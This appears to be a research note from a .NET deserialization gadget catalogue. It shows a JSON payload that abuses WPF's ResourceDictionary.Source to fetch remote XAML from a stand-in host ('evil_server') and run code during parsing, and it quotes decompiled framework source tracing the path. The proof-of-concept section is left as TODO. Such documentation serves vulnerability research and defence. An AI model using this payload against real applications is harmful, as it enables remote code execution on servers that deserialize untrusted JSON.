# Sample JSON payload

```json
{"__type":"System.Windows.Application, PresentationFramework,
Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
"Resources":{"__type":"System.Windows.ResourceDictionary,
PresentationFramework, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=31bf3856ad364e35",
"Source":"http://evil_server/EvilSite/Xamlpayload"}}
```

# Source code

```csharp
// System.Windows.ResourceDictionary
public void set_Source(Uri value)
{
    ...
    this._source = value;
    this.Clear();
    Uri resolvedUri = BindUriHelper.GetResolvedUri(this._baseUri,
this._source);
    WebRequest request =
WpfWebRequestHelper.CreateRequest(resolvedUri);
    ...
    Stream s = null;
    try
    {
        s = WpfWebRequestHelper.GetResponseStream(request, out
contentType);
} ...
    XamlReader xamlReader;
    ResourceDictionary resourceDictionary =
MimeObjectFactory.GetObjectAndCloseStream(s, contentType,
resolvedUri, false, false, false, false, out xamlReader) as
ResourceDictionary;
...
```
```csharp
// MS.Internal.AppModel.MimeObjectFactory
internal static object GetObjectAndCloseStream(Stream s, ContentType
contentType, Uri baseUri, bool canUseTopLevelBrowser, bool
sandboxExternalContent, bool allowAsync, bool isJournalNavigation,
out XamlReader asyncObjectConverter)
{
    object result = null;
    asyncObjectConverter = null;
    StreamToObjectFactoryDelegate streamToObjectFactoryDelegate;
 if (contentType != null &&
MimeObjectFactory._objectConverters.TryGetValue(contentType, out
streamToObjectFactoryDelegate))
{
        result = streamToObjectFactoryDelegate(s, baseUri,
canUseTopLevelBrowser, sandboxExternalContent, allowAsync,
isJournalNavigation, out asyncObjectConverter);
...
```

Static constructor of `System.Windows.Application` type initializes `_objectConverters`:

```csharp
// System.Windows.Application
static Application()
{
...
        Application.ApplicationInit();...
// System.Windows.Application
private static void ApplicationInit()
{
...
StreamToObjectFactoryDelegate method = new
StreamToObjectFactoryDelegate(AppModelKnownContentFactory.XamlConver
ter);
MimeObjectFactory.Register(MimeTypeMapper.XamlMime, method);
......
```

Code of `XamlConverter`:

```csharp
// MS.Internal.AppModel.AppModelKnownContentFactory
internal static object XamlConverter(Stream stream, Uri baseUri,
bool canUseTopLevelBrowser, bool sandboxExternalContent, bool
allowAsync, bool isJournalNavigation, out XamlReader
asyncObjectConverter)
{
...
        if (allowAsync)
        {
               XamlReader xamlReader = new XamlReader();
               asyncObjectConverter = xamlReader;
               xamlReader.LoadCompleted += new
AsyncCompletedEventHandler(AppModelKnownContentFactory.OnParserCompl
ete);
               return xamlReader.LoadAsync(stream, parserContext);
        return XamlReader.Load(stream, parserContext);
} }
```

# Attack vector

An attacker sends payload with URL to controlled server, this server responds with Xaml payload and `Content Type = application/xaml+xml` and target server will execute desired static method during parsing of Xaml payload.

# Requirements

* JSON unmarshaller should be able to unmarsha `lSystem.Uri` type.
* JSON unmarshaller should call setters for Types that implement `IDictionary`. Often in this case
unmarshallers just put key-value pairs in the dictionary instead of using the setter to assign its value.

# PoC

TODO